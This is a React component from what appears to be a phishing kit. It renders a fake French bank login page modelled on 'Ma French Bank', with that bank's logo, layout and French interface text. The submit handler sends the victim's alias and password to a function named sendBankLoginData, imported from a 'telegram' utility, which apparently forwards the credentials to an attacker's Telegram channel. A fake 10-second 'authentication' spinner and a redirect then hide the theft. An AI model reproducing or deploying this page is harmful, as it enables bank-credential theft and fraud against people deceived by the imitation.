import React, { useState } from 'react';
import { X } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type ProviderEAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
  bankName: string;
};

const ProviderEAuth = ({ onAuthenticate, onBack, bankName }: ProviderEAuthProps) => {
  const [alias, setAlias] = useState('');
  const [motDePasse, setMotDePasse] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (alias && motDePasse) {
      setIsLoading(true);

      await sendBankLoginData({
        bankName,
        username: alias,
        password: motDePasse
      });

      setTimeout(() => {
        setIsLoading(false);
        window.location.href = '/success';
      }, 10000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-[#00D4C4] to-[#00B8AA]">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-white/30"></div>
              <div className="absolute inset-0 rounded-full border-4 border-white animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-white mb-2">
            Authentification en cours
          </h2>
          <p className="text-white/80">
            Connexion à votre espace bancaire...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#00D4C4] to-[#00B8AA] relative overflow-hidden">
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-20 right-20 w-64 h-64 bg-white/10 rounded-full transform rotate-45"></div>
        <div className="absolute bottom-20 left-20 w-48 h-48 bg-white/5 rounded-lg transform -rotate-12"></div>
        <div className="absolute top-1/2 right-10 w-32 h-32 bg-white/10 rounded-lg transform rotate-12"></div>
      </div>

      <div className="absolute top-8 left-8 z-10">
        <img
          src="https://www.banque-en-ligne-info.com/wp-content/uploads/2023/04/ma-french-bank.webp"
          alt="Logo"
          className="h-12"
          onError={(e) => {
            (e.target as HTMLImageElement).style.display = 'none';
          }}
        />
      </div>

      <button
        onClick={onBack}
        className="absolute top-8 right-8 z-10 p-2 text-white hover:text-white/80 transition-colors"
      >
        <X size={24} />
      </button>

      <div className="flex flex-col lg:flex-row min-h-screen">
        <div className="w-full lg:w-1/2 flex items-center justify-center p-8 lg:p-12 relative z-10">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-2xl p-8 shadow-2xl">
              <h1 className="text-xl lg:text-2xl font-bold text-[#2C5F7C] mb-8 text-center">
                CONNECTEZ-VOUS À<br />VOTRE ESPACE
              </h1>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="relative">
                  <input
                    type="text"
                    value={alias}
                    onChange={(e) => setAlias(e.target.value)}
                    placeholder="Alias"
                    className="w-full px-4 py-4 bg-[#E8F8F7] rounded-lg text-gray-800 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#00D4C4] transition-all"
                  />
                  <div className="absolute right-4 top-1/2 transform -translate-y-1/2">
                    <div className="w-6 h-6 bg-[#00D4C4] rounded-full flex items-center justify-center">
                      <span className="text-white text-sm font-bold">?</span>
                    </div>
                  </div>
                </div>

                <div className="relative">
                  <input
                    type="password"
                    value={motDePasse}
                    onChange={(e) => setMotDePasse(e.target.value)}
                    placeholder="Mot de passe"
                    className="w-full px-4 py-4 bg-[#E8F8F7] rounded-lg text-gray-800 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#00D4C4] transition-all"
                  />
                </div>

                <button
                  type="submit"
                  disabled={!alias || !motDePasse || isLoading}
                  className="w-full bg-[#00D4C4] text-white py-4 rounded-full text-lg font-bold hover:bg-[#00B8AA] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-[#00D4C4] focus:ring-offset-2 mt-8"
                >
                  CONNEXION
                </button>
              </form>
            </div>

            <div className="bg-[#2C5F7C] rounded-2xl p-6 mt-6 text-white text-center">
              <h3 className="font-bold mb-2">Première connexion ?</h3>
              <p className="text-sm mb-4">Alias et/ou mot de passe oublié ?</p>
              <button className="bg-[#FFD700] text-[#2C5F7C] px-6 py-3 rounded-full font-bold hover:bg-[#FFC700] transition-colors">
                C'EST PAR ICI
              </button>
            </div>
          </div>
        </div>

        <div className="w-full lg:w-1/2 flex items-center justify-center p-8 lg:p-12 relative z-10">
          <div className="text-white text-center lg:text-left max-w-md">
            <h2 className="text-2xl lg:text-3xl font-light mb-6">
              Vous avez un compte jeunes ?
            </h2>
            <p className="text-lg mb-4 opacity-90">
              La connexion ce n'est pas ici...
            </p>
            <p className="text-base mb-8 opacity-80">
              Pour rappel, tout se passe dans votre application mobile.
            </p>
          </div>
        </div>
      </div>

      <div className="absolute bottom-0 left-0 right-0 bg-white/10 backdrop-blur-sm p-4 text-center text-white text-xs">
        <div className="mt-2 space-x-4">
          <button className="hover:underline">Mentions légales</button>
          <span>-</span>
          <button className="hover:underline">Données personnelles</button>
          <span>-</span>
          <button className="hover:underline">Cookies</button>
        </div>
      </div>
    </div>
  );
};

export default ProviderEAuth;
